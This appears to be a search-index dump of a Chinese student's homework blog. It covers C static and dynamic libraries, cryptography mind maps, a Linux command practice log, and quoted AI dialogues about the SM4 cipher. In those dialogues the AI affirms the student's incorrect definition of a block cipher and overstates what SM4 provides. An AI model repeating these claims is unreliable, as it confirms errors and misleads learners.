文件），然后将这些目标文件打包成静态库。 动态库的创建需要使用 -shared 标志，并确保代码是位置无关的（使用 -fPIC 选项）。 库的使用： 静态库在编译时通过 -l 选项链接，动态库在运行时通过设置环境变量（如 LD_LIBRARY_PATH 或 PATH）来定位。 动态库允许程序在运行时加载和链接代码，这使得代码更新更加灵活。 头文件的包含： 使用尖括号（\u003c \u003e）包含标准库头文件，使用双引号（\" \"）包含项目特定的头文件。 可以通过 -I 选项指定额外的头文件搜索路径。 库的存储位置： 静态库和动态库可以存储在标准目录（如 /usr/local/lib）或自定义目录中。 存储在标准目录的库不需要额外的路径指定，而自定义目录需要通过编译器选项或环境变量指定。 编译和链接命令： 使用 gcc 命令编译源文件和链接库。 静态库使用 ar 命令创建，动态库使用 gcc 的 -shared 选项创建。 代码重用和模块化： 通过创建库，可以在多个程序之间重用代码，提高开发效率。 库的使用促进了代码的模块化，使得代码更易于管理和维护。 实际应用案例： 文档通过一个健身房设备软件的例子，展示了如何使用静态和动态库来处理不同国家的不同度量单位。 环境变量： 在Linux和Mac上，可以通过设置 LD_LIBRARY_PATH 环境变量来指定动态库的搜索路径。 在Windows上，可以通过修改 PATH 环境变量来实现类似的功能。 动态库的优势： 动态库允许在不重新编译程序的情况下更新程序功能，使得程序更加灵活和易于维护。 本章通过具体的代码示例和操作步骤，向读者展示了如何在C语言项目中创建和使用静态库与动态库，以及如何通过这些技术提高代码的可重用性和可维护性。 ","date":"2024-09-15","objectID":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:1","tags":[null],"title":"第二周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"对AI总结的反思\r要求\rAI总结的问题 反思\rAI总结比较精简，适合作为提纲、导图等方式指导学习，更有助于分配自己的学习时间和精力 ","date":"2024-09-15","objectID":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:2","tags":[null],"title":"第二周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"学习思维导图\r要求\rMermaid 代码与截图(参考Mermaid MindMap语法)或者提交思维导图链接（如果使用线上编辑器，推荐processon,xmind,…） 思维导图\r代码: mindmap root(密码系统设计) sub章(第三章 对称密码算法) 3_1(3.1 对称密码算法概述) 3_1_a(基本概念) 3_1_b(优点) 3_1_c(缺点) 3_1_d(常用算法) 3_2(3.2 对称加解密算法分类) 3_2_a(流加解密算法) 3_2_b(分组加解密算法) 3_3(3.3 流加密算法) 3_3_a(基本概念) 3_3_b(分类) 3_3_c(RC4算法) 3_4(3.4 分组加密算法) 3_4_a(工作模式) 3_4_a1(ECB) 3_4_a2(CBC) 3_4_a3(CFB) 3_4_a4[OFB) 3_4_a5(CTR) 3_4_b(短块加密) 3_4_c(DES和3DES算法) 3_4_c1(DES概述) 3_4_c2(DES算法的密钥) 3_4_c3(DES算法的原理) 3_4_c4(3DES) 3_4_d(SM4算法) 3_5(3.5 利用OpenSSL进行对称加解密) 3_5_a(基本概念) 3_5_b(对称加解密相关函数) 3_5_c(编程实现) sub章(第五章 密码学中常见的编码格式) 5_1(5.1 Base64编码) 5_1_a(由来) 5_1_b(索引表) 5_1_c(转化原理) 5_1_d(使用OpenSSL的base64命令) 5_1_e(编程实现Base64编解码) 5_2(5.2 PEM文件) 5_2_a(什么是PEM文件) 5_2_b(生成一个PEM文件) 5_3(5.3 ASN.1和BER, DER) 5_3_a(ASN.1的历史) 5_3_b(ASN.1的基本概念) 5_3_c(ASN.1和ASN.1编码规则在OSI中的应用) 5_3_d(电子商务中ASN.1和DER编码的应用) 5_3_e(ASN的优点) 5_3_f(ASN.1的文法描述) 5_3_g(编码规则) 5_3_g1(数据类型标识) 5_3_g2(派生数据类型标识) 5_3_g3(BER) 5_3_g4(DER) 5_3_h(有关数据类型的ASN.1描述和DER) 5_3_h1(隐式派生类) 5_3_h2(显式派生类型) 5_3_h3(BITSTRING类型) 5_3_h4(IA5STRING类型) 5_3_h5(INTEGER类型) 5_3_h6(OBJECTIDENTIFIER类型) 5_3_h7(OCTETSTRING类型) 5_3_h8(SEQUENCE类型) 5_3_i(ASN.1实例)mindmap root(第八章 静态与动态库) sub章(8.1 静态库) 8_1_a(定义) 8_1_b(编译时链接) sub章(8.2 动态库) 8_2_a(定义) 8_2_b(运行时链接) sub章(8.3 创建自己的库) 8_3_a(编译生成目标文件) 8_3_b(打包成静态库) 8_3_c(创建动态库需位置无关代码) sub章(8.4 使用库) 8_4_a(静态库: -l选项) 8_4_b(动态库: LD_LIBRARY_PATH或PATH) sub章(8.5 头文件的包含) 8_5_a(尖括号\u003c\u003e用于标准库) 8_5_b(双引号\"\"用于项目特定) sub章(8.6 库的存储位置) 8_6_a(标准目录如/usr/local/lib) 8_6_b(自定义目录) sub章(8.7 编译和链接命令) 8_7_a(gcc编译命令) 8_7_b(ar创建静态库) 8_7_c(gcc -shared创建动态库) sub章(8.8 代码重用与模块化) 8_8_a(提高开发效率) 8_8_b(易于管理和维护) sub章(8.9 实际应用案例) 8_9_a(健身房设备软件) sub章(8.10 环境变量) 8_10_a(Linux/Mac: LD_LIBRARY_PATH) 8_10_b(Windows: PATH) sub章(8.11 动态库的优势) 8_11_a(无需重新编译更新功能) 8_11_b(程序更灵活易维护)mindmap\rroot(密码系统设计)\rsub章(第三章 对称密码算法)\r3_1(3.1 对称密码算法概述)\r3_1_a(基本概念)\r3_1_b(优点)\r3_1_c(缺点)\r3_1_d(常用算法)\r3_2(3.2 对称加解密算法分类)\r3_2_a(流加解密算法)\r3_2_b(分组加解密算法)\r3_3(3.3 流加密算法)\r3_3_a(基本概念)\r3_3_b(分类)\r3_3_c(RC4算法)\r3_4(3.4 分组加密算法)\r3_4_a(工作模式)\r3_4_a1(ECB)\r3_4_a2(CBC)\r3_4_a3(CFB)\r3_4_a4[OFB)\r3_4_a5(CTR)\r3_4_b(短块加密)\r3_4_c(DES和3DES算法)\r3_4_c1(DES概述)\r3_4_c2(DES算法的密钥)\r3_4_c3(DES算法的原理)\r3_4_c4(3DES)\r3_4_d(SM4算法)\r3_5(3.5 利用OpenSSL进行对称加解密)\r3_5_a(基本概念)\r3_5_b(对称加解密相关函数)\r3_5_c(编程实现)\rsub章(第五章 密码学中常见的编码格式)\r5_1(5.1 Base64编码)\r5_1_a(由来)\r5_1_b(索引表)\r5_1_c(转化原理)\r5_1_d(使用OpenSSL的base64命令)\r5_1_e(编程实现Base64编解码)\r5_2(5.2 PEM文件)\r5_2_a(什么是PEM文件)\r5_2_b(生成一个PEM文件)\r5_3(5.3 ASN.1和BER, DER)\r5_3_a(ASN.1的历史)\r5_3_b(ASN.1的基本概念)\r5_3_c(ASN.1和ASN.1编码规则在OSI中的应用)\r5_3_d(电子商务中ASN.1和DER编码的应用)\r5_3_e(ASN的优点)\r5_3_f(ASN.1的文法描述)\r5_3_g(编码规则)\r5_3_g1(数据类型标识)\r5_3_g2(派生数据类型标识)\r5_3_g3(BER)\r5_3_g4(DER)\r5_3_h(有关数据类型的ASN.1描述和DER)\r5_3_h1(隐式派生类)\r5_3_h2(显式派生类型)\r5_3_h3(BITSTRING类型)\r5_3_h4(IA5STRING类型)\r5_3_h5(INTEGER类型)\r5_3_h6(OBJECTIDENTIFIER类型)\r5_3_h7(OCTETSTRING类型)\r5_3_h8(SEQUENCE类型)\r5_3_i(ASN.1实例)\rmindmap\rroot(密码系统设计)\rsub章(第三章 对称密码算法)\r3_1(3.1 对称密码算法概述)\r3_1_a(基本概念)\r3_1_b(优点)\r3_1_c(缺点)\r3_1_d(常用算法)\r3_2(3.2 对称加解密算法分类)\r3_2_a(流加解密算法)\r3_2_b(分组加解密算法)\r3_3(3.3 流加密算法)\r3_3_a(基本概念)\r3_3_b(分类)\r3_3_c(RC4算法)\r3_4(3.4 分组加密算法)\r3_4_a(工作模式)\r3_4_a1(ECB)\r3_4_a2(CBC)\r3_4_a3(CFB)\r3_4_a4[OFB)\r3_4_a5(CTR)\r3_4_b(短块加密)\r3_4_c(DES和3DES算法)\r3_4_c1(DES概述)\r3_4_c2(DES算法的密钥)\r3_4_c3(DES算法的原理)\r3_4_c4(3DES)\r3_4_d(SM4算法)\r3_5(3.5 利用OpenSSL进行对称加解密)\r3_5_a(基本概念)\r3_5_b(对称加解密相关函数)\r3_5_c(编程实现)\rsub章(第五章 密码学中常见的编码格式)\r5_1(5.1 Base64编码)\r5_1_a(由来)\r5_1_b(索引表)\r5_1_c(转化原理)\r5_1_d(使用OpenSSL的base64命令)\r5_1_e(编程实现Base64编解码)\r5_2(5.2 PEM文件)\r5_2_a(什么是PEM文件)\r5_2_b(生成一个PEM文件)\r5_3(5.3 ASN.1和BER, DER)\r5_3_a(ASN.1的历史)\r5_3_b(ASN.1的基本概念)\r5_3_c(ASN.1和ASN.1编码规则在OSI中的应用)\r5_3_d(电子商务中ASN.1和DER编码的应用)\r5_3_e(ASN的优点)\r5_3_f(ASN.1的文法描述)\r5_3_g(编码规则)\r5_3_g1(数据类型标识)\r5_3_g2(派生数据类型标识)\r5_3_g3(BER)\r5_3_g4(DER)\r5_3_h(有关数据类型的ASN.1描述和DER)\r5_3_h1(隐式派生类)\r5_3_h2(显式派生类型)\r5_3_h3(BITSTRING类型)\r5_3_h4(IA5STRING类型)\r5_3_h5(INTEGER类型)\r5_3_h6(OBJECTIDENTIFIER类型)\r5_3_h7(OCTETSTRING类型)\r5_3_h8(SEQUENCE类型)\r5_3_i(ASN.1实例)mindmap\rroot(第八章 静态与动态库)\rsub章(8.1 静态库)\r8_1_a(定义)\r8_1_b(编译时链接)\rsub章(8.2 动态库)\r8_2_a(定义)\r8_2_b(运行时链接)\rsub章(8.3 创建自己的库)\r8_3_a(编译生成目标文件)\r8_3_b(打包成静态库)\r8_3_c(创建动态库需位置无关代码)\rsub章(8.4 使用","date":"2024-09-15","objectID":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:3","tags":[null],"title":"第二周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"基于AI的学习\r要求\r至少找到自己理解不是太好2个概念，让AI对自己进行苏格拉底提问 参考下面提示词或者使用AI Agent 提示词：“我在学习XXX知识点，请你以苏格拉底的方式对我进行提问，一次一个问题”\r1. 核心是要求AI工具：“请你以苏格拉底的方式对我进行提问”\r2. 然后AI工具就会给你提问，如果不知道问题的答案，可以反问AI：“你的理解（回答）是什么？”\r3. 如果你觉得差不多了，可以先问问AI工具：“针对我XXX知识点，我理解了吗？”\r4. AI工具会给出它的判断，如果你也觉得自己想清楚了，可以最后问AI工具：“我的回答结束了，请对我的回答进行评价总结”，让它帮你总结一下。学习内容\rHuman: 我在学习SM4算法知识点，请你以苏格拉底的方式对我进行提问，一次一个问题AI: 当然可以。苏格拉底式的提问是一种引导性的对话方式，旨在帮助对方深入思考并自己发现答案。让我们开始吧：\r1. 你能告诉我什么是SM4算法吗？Human: 是一种分组密码算法AI: 很好，你已经指出了SM4算法是一种分组密码算法。那么，你能进一步解释一下什么是分组密码算法吗？Human: 将明文流分组，每一个分组使用一个不同的密钥加密AI: 非常好，你已经理解了分组密码算法的基本工作原理。现在，让我们深入一点：\r1. 在SM4算法中，一个分组通常包含多少比特？Human: 128bitAI: 正确，SM4算法中一个分组确实是128比特。那么，你能描述一下SM4算法的加密过程吗？它通常包括哪些步骤？Human: 不太了解AI: SM4算法是一种分组密码算法，它的分组长度和密钥长度都是128比特。这种算法采用了32轮的加密过程，每一轮都使用不同的轮密钥。加密过程包括多个步骤，如轮密钥加、S盒替换、线性变换等。SM4算法的设计目标是在确保安全性的同时，提供足够的效率和灵活性，适用于多种安全应用场景，包括移动支付、物联网(IoT)和云计算等。\r在加密过程中，SM4算法首先进行密钥扩展，将原始128比特的密钥扩展成32个32比特的轮密钥。然后，通过非线性变换和线性变换对输入数据进行多轮迭代，最终输出加密结果。SM4算法的安全性已经经过严格的数学分析和实际测试，证明其具有较高的安全性，在同等密钥长度下，SM4的安全性与AES相当。\rSM4算法支持多种工作模式，包括ECB（电子密码本模式）、CBC（密码块链接模式）、CFB（密码反馈模式）、OFB（输出反馈模式）和CTR（计数器模式）。每种模式都有其特定的使用场景和特点。例如，CBC模式通过使用前一个块的密文与当前块的明文进行XOR操作后再加密，提高了安全性，适用于文件加密、网络通信等场合。\r在硬件实现方面，SM4算法的加密芯片在金融支付、智能卡、移动设备等领域发挥着重要作用。然而，即使是采用了多种加密算法的芯片，也不一定在实践中总是安全的。侧信道攻击和功耗分析攻击已经成为加密芯片攻击领域的热点。通过监测加密芯片在数据加密过程中产生的物理信息，如功耗、电磁辐射等，可以解密加密算法。\r总的来说，SM4算法是一种安全且高效的加密算法，适用于多种应用场景，并且在硬件实现方面也得到了广泛的应用和研究。","date":"2024-09-15","objectID":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:4","tags":[null],"title":"第二周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"学习实践过程遇到的问题与解决方式（AI 驱动，优先使用AI工具解决问题）\rQ:SM4算法的安全性依靠什么保障 A: SM4算法的安全性主要依靠以下几个方面来保障： 加密算法的复杂性：SM4算法采用32轮的迭代加密过程，每一轮都使用不同的轮密钥，这种多轮迭代的设计增加了破解的难度。 密钥的保密性：SM4算法的密钥长度为128位，与分组长度相同，保证了密钥的复杂度，使得通过穷举密钥的方式变得不切实际。 轮密钥的生成：SM4算法通过密钥扩展算法生成32个轮密钥，这些轮密钥在加密过程中依次使用，增加了算法的安全性。 S盒（S-Box）的非线性变换：SM4算法中的S盒提供了强大的非线性特性，使得加密过程难以被线性或非线性攻击破解。 线性变换的复杂性：SM4算法中的线性变换增加了算法的复杂性，使得密码分析更加困难。 国家密码管理局的认可：SM4算法得到了国家密码管理局的认可，这意味着它已经通过了严格的安全审查和测试。 抗侧信道攻击的措施：SM4算法在设计时也考虑到了对侧信道攻击的防护，如功耗分析攻击等，通过掩码技术和硬件实现的优化来提高抗攻击能力。 算法的自主知识产权：作为中国自主研发的加密算法，SM4拥有完整的知识产权，减少了对外部技术的依赖，有助于增强国家信息安全。 通过这些设计，SM4算法在确保数据的机密性、完整性和认证性方面提供了强有力的保障。 ","date":"2024-09-15","objectID":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:5","tags":[null],"title":"第二周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"作业提交要求\r提交Markdown文件,文档命名“学号姓名《密码系统设计》.md” . 提交Markdown文件转为 PDF,文档命名“学号姓名《密码系统设计》第 X 周.pdf” 提交代码托管链接（可选）：学号姓名 gitee(github) 链接 内容质量高有加分 参考链接： AI工具 ChatGPT Kimi.ai - 帮你看更大的世界 (moonshot.cn) 图书 《Window C/C++加密解密实战》 《Head.First.C》 ","date":"2024-09-15","objectID":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:6","tags":[null],"title":"第二周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"课上测试\r","date":"2024-09-10","objectID":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/:0:0","tags":[null],"title":"Linux命令实践","uri":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/"},{"categories":["homework"],"content":"作业题目：Linux命令实践\r","date":"2024-09-10","objectID":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/:1:0","tags":[null],"title":"Linux命令实践","uri":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/"},{"categories":["homework"],"content":"学习Linux核心命令\rls who pwd cd man whereis which find locate grep ","date":"2024-09-10","objectID":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/:1:1","tags":[null],"title":"Linux命令实践","uri":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/"},{"categories":["homework"],"content":"作业要求（9‘）\r参考课件，针对上面核心命令重复老师的演示内容（3’） 选择自己习惯的 AI 工具， 针对上面核心命令，让 AI 给自己生成至少例子，然后自己进行验证，总结（3’） 让 AI工具推荐一些重要命令，然后选择自己认为会高频应用的至少 3个命令（重点推荐 echo，od，sort，bc，ls）进行自主深入学习，每个命令不少于 5 个例子，提交验证，实践过程和总结（3’） ","date":"2024-09-10","objectID":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/:1:2","tags":[null],"title":"Linux命令实践","uri":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/"},{"categories":["homework"],"content":"实践\r","date":"2024-09-10","objectID":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/:2:0","tags":[null],"title":"Linux命令实践","uri":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/"},{"categories":["homework"],"content":"重复老师演示得内容\rls $ ls GmSSL-master py snap $ ls . GmSSL-master py snap $ ls -a . .bash_logout .config .java .motd_shown .sage GmSSL-master .. .bashrc .gdbinit .lesshst .profile .sudo_as_admin_successful py .bash_history .cache .gitconfig .local .pycharm_helpers .viminfo snap $ ls -l total 12 drwxr-xr-x 9 zhanhe zhanhe 4096 Sep 4 10:08 GmSSL-master drwxr-xr-x 3 zhanhe zhanhe 4096 Aug 22 14:05 py drwx------ 3 zhanhe zhanhe 4096 Sep 10 11:01 snap $ ls -R .: GmSSL-master py snap ./GmSSL-master: CMakeLists.txt INSTALL.md LICENSE README.md build cmake include src tests tools 内容过多，仅复制一小段 $ ls -lh total 12K drwxr-xr-x 9 zhanhe zhanhe 4.0K Sep 4 10:08 GmSSL-master drwxr-xr-x 3 zhanhe zhanhe 4.0K Aug 22 14:05 py drwx------ 3 zhanhe zhanhe 4.0K Sep 10 11:01 snap who $ who zhanhe pts/1 2024-09-10 11:04 $ whoami zhanhe $ who -a system boot 2024-09-10 11:04 run-level 5 2024-09-10 11:04 LOGIN tty1 2024-09-10 11:04 292 id=tty1 LOGIN console 2024-09-10 11:04 285 id=cons zhanhe - pts/1 2024-09-10 11:04 00:15 427 pwd $ pwd /home/zhanhe cd ~$ cd / /$ pwd / /$ cd /home/zhanhe ~$ pwd /home/zhanhe /$ cd ~ ~$ pwd /home/zhanhe ~/GmSSL-master$ cd . ~/GmSSL-master$ pwd /home/zhanhe/GmSSL-master ~/GmSSL-master$ cd .. ~$ pwd /home/zhanhe ~$ cd - /home/zhanhe/GmSSL-master ~/GmSSL-master$ man MAN(1) Manual pager utils MAN(1) NAME man - an interface to the system reference manuals PRINTF(1) User Commands PRINTF(1) NAME printf - format and print data PRINTF(3) Linux Programmer's Manual PRINTF(3) NAME printf, fprintf, dprintf, sprintf, snprintf, vprintf, vfprintf, vdprintf, vsprintf, vsnprintf - formatted output con‐ version $ man -k printf asprintf (3) - print to allocated string dprintf (3) - formatted output conversion fmtcheck (3bsd) - sanitizes user-supplied printf(3)-style format string fprintf (3) - formatted output conversion fwprintf (3) - formatted wide-character output conversion printf (1) - format and print data printf (3) - formatted output conversion set_matchpathcon_printf (3) - set flags controlling the operation of matchpathcon or matchpathcon_index and configure the beh... snprintf (3) - formatted output conversion sprintf (3) - formatted output conversion swprintf (3) - formatted wide-character output conversion vasprintf (3) - print to allocated string vdprintf (3) - formatted output conversion vfprintf (3) - formatted output conversion vfwprintf (3) - formatted wide-character output conversion vprintf (3) - formatted output conversion vsnprintf (3) - formatted output conversion vsprintf (3) - formatted output conversion vswprintf (3) - formatted wide-character output conversion vwprintf (3) - formatted wide-character output conversion wprintf (3) - formatted wide-character output conversion XtAsprintf (3) - memory management functions $ man -f printf printf (1) - format and print data printf (3) - formatted output conversion $ man -k printf | grep 3 asprintf (3) - print to allocated string dprintf (3) - formatted output conversion fmtcheck (3bsd) - sanitizes user-supplied printf(3)-style format string fprintf (3) - formatted output conversion fwprintf (3) - formatted wide-character output conversion printf (3) - formatted output conversion set_matchpathcon_printf (3) - set flags controlling the operation of matchpathcon or matchpathcon_index and configure the beh... snprintf (3) - formatted output conversion sprintf (3) - formatted output conversion swprintf (3) - formatted wide-character output conversion vasprintf (3) - print to allocated string vdprintf (3) - formatted output conversion vfprintf (3) - formatted output conversion vfwprintf (3) - formatted wide-character output conversion vprintf (3) - formatted output conversion vsnprintf (3) - formatted output conversion vsprintf (3) - formatted output conversion vswprintf (3) - formatted wide-character output conversion vwprintf (3) - formatted wide-character output conversion wprintf (3) - formatted wide-character output conversion XtAsprintf (3) - memory management functions whereis $ w","date":"2024-09-10","objectID":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/:2:1","tags":[null],"title":"Linux命令实践","uri":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/"},{"categories":["homework"],"content":"AI-常用指令\rAI回答\r当然！以下是这些常用Linux命令的解释和使用示例： 1. ls - 列出目录内容\rls 命令用于列出当前目录或指定目录中的文件和子目录。 示例 1: 列出当前目录下的所有文件和目录 ls 示例 2: 列出详细信息（包括权限、所有者、大小、修改时间等） ls -l 示例 3: 列出包含隐藏文件的所有文件和目录 ls -a 2. who - 显示当前登录的用户\rwho 命令用于显示当前登录到系统的所有用户信息。 示例 1: 显示当前登录的用户列表 who 示例 2: 显示用户的登录时间和TTY信息 who -u 3. pwd - 显示当前工作目录\rpwd 命令用于显示当前所在的工作目录的绝对路径。 示例 1: 显示当前目录的路径 pwd 4. cd - 更改目录\rcd 命令用于在文件系统中更改当前工作目录。 示例 1: 切换到指定目录 cd /home/user/Documents 示例 2: 返回到上一级目录 cd .. 示例 3: 切换到用户的主目录 cd ~ 5. man - 显示手册页\rman 命令用于显示指定命令的手册页，可以查看命令的详细信息和使用方式。 示例 1: 查看 ls 命令的手册页 man ls 示例 2: 查看 man 命令的手册页 man man 6. whereis - 查找二进制、源代码和手册页文件\rwhereis 命令用于定位二进制文件、源代码文件和手册页文件的路径。 示例 1: 查找 ls 命令的路径 whereis ls 示例 2: 查找 bash 命令的所有相关文件 whereis bash 7. which - 显示命令的可执行文件路径\rwhich 命令用于显示指定命令的可执行文件所在路径。 示例 1: 显示 python 命令的路径 which python 示例 2: 显示 ls 命令的路径 which ls 8. find - 查找文件\rfind 命令用于查找目录树中的文件和目录。 示例 1: 在当前目录及其子目录中查找名为 file.txt 的文件 find . -name \"file.txt\" 示例 2: 查找大小超过 10MB 的文件 find / -size +10M 9. locate - 查找文件\rlocate 命令通过查询预先构建的数据库快速查找文件。 示例 1: 查找名为 passwd 的文件 locate passwd 示例 2: 查找包含 conf 的所有文件 locate conf 10. grep - 搜索文本\rgrep 命令用于在文件或输入中搜索匹配的文本模式。 示例 1: 在文件 logfile.txt 中查找包含 error 的行 grep \"error\" logfile.txt 示例 2: 查找当前目录下所有 .txt 文件中包含 example 的行 grep \"example\" *.txt 示例 3: 搜索时忽略大小写 grep -i \"example\" logfile.txt 总结\r这些命令是Linux系统中常用的基本命令，掌握这些命令将帮助你高效地管理和操作系统。 实践\rgrep\r$ ls GmSSL-master flag py snap $ cat flag FLAG flag flag FLAG $ grep \"flag\" flag flag flag $ grep -i \"flag\" flag FLAG flag flag FLAG $ grep -i \"flag\" * grep: GmSSL-master: Is a directory flag:FLAG flag:flag flag:flag flag:FLAG grep: py: Is a directory grep: snap: Is a directoryfind\r$ find / -size +1024M find: ‘/etc/polkit-1/localauthority’: Permission denied find: ‘/etc/ssl/private’: Permission denied find: ‘/root’: Permission denied find: ‘/mnt/e/$RECYCLE.BIN/S-1-5-21-1401408247-2291080922-2548902397-1001’: Permission denied find: ‘/mnt/e/$RECYCLE.BIN/S-1-5-21-1401408247-2291080922-2548902397-1002’: Permission denied /mnt/e/20240827_113100.mp4 /mnt/e/20240827_165004.mp4 /mnt/e/20240908_101433.mp4 /mnt/e/BaiduNetdiskDownload/MATLAB R2024a(64bit)/Setup/archives/win64/3p/cuda_win64_1700448735.enc /mnt/e/BaiduNetdiskDownload/MATLAB R2024a(64bit).zip /mnt/e/kali-linux-2024.2-vmware-amd64.7z /mnt/e/kali-linux-2024.2-vmware-amd64.vmwarevm/kali-linux-2024.2-vmware-amd64-s001.vmdk /mnt/e/kali-linux-2024.2-vmware-amd64.vmwarevm/kali-linux-2024.2-vmware-amd64-s002.vmdk /mnt/e/kali-linux-2024.2-vmware-amd64.vmwarevm/kali-linux-2024.2-vmware-amd64-s035.vmdk ......","date":"2024-09-10","objectID":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/:2:2","tags":[null],"title":"Linux命令实践","uri":"/posts/homework/linux%E5%91%BD%E4%BB%A4%E5%AE%9E%E8%B7%B5/"},{"categories":["homework"],"content":"AI推荐重要命令\rAI回答\r当然可以！以下是一些在 Linux 中非常重要和常用的指令，涵盖系统管理、文件操作、网络管理等多个方面： 1. ls\r用途: 列出目录内容。 重要性: 这是文件管理的基础命令，用于查看目录下的文件和文件夹。 2. cd\r用途: 更改当前工作目录。 重要性: 每次在文件系统中导航时都需要使用这个命令。 3. pwd\r用途: 显示当前工作目录的绝对路径。 重要性: 当你需要确认自己当前所在的目录时，这个命令非常有用。 4. cp\r用途: 复制文件或目录。 重要性: 用于备份文件或在不同目录之间复制文件。 5. mv\r用途: 移动文件或重命名文件。 重要性: 用于组织文件、将文件从一个位置移动到另一个位置，或重命名文件。 6. rm\r用途: 删除文件或目录。 重要性: 在清理不再需要的文件或目录时，使用这个命令。 7. chmod\r用途: 更改文件或目录的权限。 重要性: 这个命令是管理文件权限、确保安全性的重要工具。 8. chown\r用途: 更改文件或目录的所有者和组。 重要性: 在管理多用户系统时，确保正确的所有权设置至关重要。 9. tar\r用途: 归档文件（通常与 gzip 结合使用）。 重要性: 在备份、压缩和传输文件时非常有用。 10. ps\r用途: 显示当前运行的进程。 重要性: 用于监视和管理系统上的进程，了解正在运行的程序。 11. top\r用途: 实时显示系统进程和资源使用情况。 重要性: 监视系统性能，特别是在诊断性能问题时。 12. kill\r用途: 终止进程。 重要性: 当进程挂起或消耗大量资源时，可以使用它来强制终止进程。 13. df\r用途: 显示文件系统磁盘空间使用情况。 重要性: 检查磁盘使用情况，防止磁盘空间不足。 14. du\r用途: 显示目录或文件的磁盘使用量。 重要性: 了解哪个目录或文件占用了大量磁盘空间。 15. ssh\r用途: 通过网络远程登录到另一台机器。 重要性: 管理和控制远程服务器的基本工具。 16. scp\r用途: 通过 SSH 安全地复制文件。 重要性: 在远程机器之间传输文件时，非常有用。 17. wget\r用途: 从网络下载文件。 重要性: 自动化下载任务、获取文件的实用工具。 18. curl\r用途: 使用 URL 语法传输数据。 重要性: 用于测试 API 接口、下载文件或检查网络资源。 19. iptables\r用途: 配置 Linux 内核的网络包过滤规则。 重要性: 管理和配置防火墙，确保系统的网络安全。 20. systemctl\r用途: 控制 systemd 系统和服务管理器。 重要性: 管理系统服务、启动和停止服务、查看系统状态等。 21. crontab\r用途: 定时任务调度。 重要性: 自动化任务执行，例如定期备份、系统清理。 22. grep\r用途: 搜索文本中的特定模式。 重要性: 快速查找日志文件或其他文本文件中的特定内容。 23. find\r用途: 查找文件或目录。 重要性: 在复杂的文件系统中查找文件时非常有用。 24. alias\r用途: 为命令创建别名。 重要性: 简化常用命令，节省输入时间。 25. echo\r用途: 显示一段文本或变量的值。 重要性: 调试脚本时，经常用于输出信息。 总结：掌握这些命令将极大地提升你在Linux系统上的工作效率和管理能力。 实践\recho\r$ echo \"123gsgdhdhFGH\" 123gsgdhdhFGH #echo重定向 $ echo \"This text goes to a file\" \u003e\u003e file.txt $ cat file.txt This text goes to a file $ echo * GmSSL-master file.txt flag py snap #清空文件 $ echo \u003e file.txt $ cat file.txt #以颜色显示 echo 命令输出 $ echo -e \"\\033[31m这是红色\" 这是红色 #查看命令在不运行的情况下会执行什么操作 $ echo rm -R * rm -R GmSSL-master file.txt flag py snaptar\r1、创建归档文件：将文件 file1、file2 和 directory 打包到一个名为 archive.tar 的归档文件中。 $ tar -cvf flag.tar flag flag1 flag2 flag flag1 flag2 $ ls GmSSL-master file.txt flag flag.tar flag1 flag2 py snap 2、解压归档文件：解压名为 archive.tar 的归档文件，还原其中包含的文件和目录。 $tar -xvf flag.tar flag flag1 flag2 3、列出归档文件中的内容：列出名为 archive.tar 的归档文件中包含的所有文件和目录。 $ tar -tvf flag.tar -rw-r--r-- zhanhe/zhanhe 20 2024-09-10 12:25 flag -rw-r--r-- zhanhe/zhanhe 17 2024-09-10 17:55 flag1 -rw-r--r-- zhanhe/zhanhe 23 2024-09-10 17:56 flag2 4、追加文件到已存在的归档中：将名为 